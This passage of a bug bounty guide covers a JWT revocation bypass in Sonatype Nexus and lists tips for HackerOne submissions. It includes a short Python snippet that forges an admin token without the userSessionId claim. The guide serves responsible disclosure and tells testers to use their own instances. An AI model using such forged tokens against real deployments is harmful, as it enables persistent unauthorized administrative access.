3. Observe lines 117-139: the `if (!userSessionIdClaim.isNull())` check
4. Note that tokens **without** this claim fall through to line 141 and are accepted
5. **Screenshot:** Take a screenshot highlighting the conditional block

### Step 2: Verify JWT cookie structure

1. Log in to Nexus in your browser
2. Open DevTools (F12) > Application > Cookies
3. Find the `NXSESSIONID` cookie
4. Copy the JWT value
5. Decode it at https://jwt.io
6. **Screenshot:** Take a screenshot showing the JWT payload with `userSessionId` claim

### Step 3: Demonstrate the bypass (conceptual)

1. Show that removing the `userSessionId` claim from the JWT payload and re-signing it would
   create a token that cannot be revoked
2. If you have the JWT signing secret (from Report 1's database decryption chain), you can:
   ```python
   import jwt

   # Forge a token without userSessionId
   payload = {
       "sub": "admin",
       "user": "admin",
       "realm": "NexusAuthorizingRealm",
       "iss": "sonatype",
       "iat": 1711536000,
       "exp": 1711539600
       # Note: NO userSessionId claim
   }
   token = jwt.encode(payload, "your-secret-here", algorithm="HS256")
   ```

3. **Screenshot:** Take a screenshot of the forged token decoded at jwt.io showing no `userSessionId`

### Step 4: Verify the revocation service is bypassed

1. In the source code, show that `JwtSessionRevocationService.isRevoked()` is only called inside
   the `if (!userSessionIdClaim.isNull())` block
2. Tokens without the claim skip this check entirely
3. **Screenshot:** Take a screenshot of the code flow

## Impact

- Tokens without `userSessionId` cannot be revoked (logging out an admin has no effect on these tokens)
- An attacker with the JWT secret can create persistent access tokens that survive password changes
  and session invalidation
- Legacy tokens from older Nexus versions may lack this claim

## Remediation

- Reject all JWTs that do not contain the `userSessionId` claim
- Implement a global "issued before" timestamp check as an additional revocation mechanism
- Add token version/generation tracking

---
---

# General Tips for HackerOne Submission

## Report Quality Checklist

For each report, ensure you include:

- [ ] **Clear title** describing the vulnerability type and impact
- [ ] **Severity rating** with CVSS score
- [ ] **CWE classification**
- [ ] **One-paragraph summary** explaining the issue
- [ ] **Vulnerable code** with exact file paths and line numbers
- [ ] **Step-by-step reproduction** with commands
- [ ] **Screenshots** at each significant step
- [ ] **Impact statement** describing what an attacker can achieve
- [ ] **Remediation suggestion** showing you understand the fix

## Screenshot Recommendations

For each report, aim to capture:

1. **Source code screenshot** from GitHub showing the vulnerable code
2. **Setup screenshot** showing the test environment
3. **Exploitation screenshot** showing the vulnerability being triggered
4. **Impact screenshot** showing what the attacker gains
5. **Network/DevTools screenshot** showing relevant HTTP requests/responses

## Submission Order (Recommended)

Submit in this order for maximum impact:

1. **Report 1** (Hardcoded encryption key) - Most straightforward critical
2. **Report 2** (Deserialization) - Chain with Report 1
3. **Report 3** (Groovy sandbox bypass) - Most demonstrable RCE
4. **Report 4** (Default admin password) - Easy to reproduce
5. **Report 5** (SSRF) - Demonstrable with screenshots
6. **Report 6** (XSS) - Source code evidence strong
7. **Report 7** (CSRF bypass) - Needs PoC page
8. **Report 8** (Weak hashing) - Straightforward evidence
9. **Report 9** (JWT revocation bypass) - Requires deeper analysis

## Important Notes

- **Submit one report per vulnerability** -- do not combine them
- **Reference other reports** when they form a chain (e.g., "Combined with report #XXXXX...")
- **Be professional** -- avoid hyperbole, stick to technical facts
- **Disclose responsibly** -- do not test against production Sonatype infrastructure
- **Use your own test instance** for all reproduction steps
- **Check the program scope** -- some findings may be out of scope for their program
